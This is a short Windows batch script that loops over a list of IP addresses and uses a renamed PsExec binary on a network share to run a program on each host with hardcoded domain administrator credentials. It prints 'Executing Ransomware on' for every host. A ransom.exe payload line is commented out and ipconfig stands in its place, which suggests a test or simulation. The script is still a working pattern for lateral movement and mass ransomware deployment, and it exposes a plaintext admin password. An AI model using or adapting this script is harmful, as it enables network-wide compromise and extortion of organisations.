@echo off
setlocal enabledelayedexpansion

set PSSEXEC_PATH=\\172.31.4.175\GSEE_Share_APAC\FinancialReportPs.exe
:: set SOURCE_EXE=\\172.31.4.175\GSEE_Share_APAC\ransom.exe
set SOURCE_EXE=ipconfig

set USER=Voxel\Administrator
set PASS=root*123

for /f "usebackq tokens=* delims= " %%i in ("ip.txt") do (
    echo -------------------------------------------------
    echo Executing Ransomware on %%i
    "%PSSEXEC_PATH%" \\%%i -accepteula -u %USER% -p %PASS% "%SOURCE_EXE%"
)
pause
endlocal
